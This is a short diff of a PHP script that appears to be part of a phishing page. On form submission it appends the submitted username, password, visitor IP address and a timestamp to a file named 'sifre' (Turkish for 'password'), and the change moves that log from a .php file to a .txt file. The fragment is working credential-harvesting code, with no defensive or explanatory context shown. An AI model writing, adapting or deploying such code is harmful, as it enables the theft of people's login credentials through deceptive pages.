@@ -12,7 +12,7 @@ if ($_POST) {
 		$ip = $_SERVER['REMOTE_ADDR'];
 		date_default_timezone_set('Europe/Istanbul');  
 		$cur_time=date("d-m-Y H:i:s");
-		$file = fopen('sifre.php', 'a'); 
+		$file = fopen('sifre.txt', 'a'); 
 		fwrite($file, "<font color='red'>".$kad."</font><br><font color='green'>".$pass. "</font><br><font color='black'>".$ip. "</font><br><font color='orange'>".$cur_time. "</font>\n\n <hr>");
 		fclose($file); 
 		echo '';
